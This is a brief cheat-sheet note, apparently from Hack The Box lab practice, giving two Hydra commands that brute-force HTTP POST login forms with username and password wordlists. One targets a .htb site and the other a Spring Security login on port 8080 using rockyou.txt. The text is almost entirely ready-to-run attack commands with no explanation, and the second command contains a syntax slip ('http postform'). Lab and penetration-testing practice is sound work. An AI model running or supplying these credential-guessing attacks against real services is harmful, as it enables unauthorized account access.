# Hydra

## http post form password brute force attack.  

`hydra -L usernames.txt -P passwords.txt site.htb http-post-form "/path/file.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed."`  

On a proxy port 8080.  

`hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8080 10.129.5.200 http postform"/j_spring_security_check:j_username=admin&j_password=^PASS^&from=&Submit=Sign+in:Invalid username or password"`
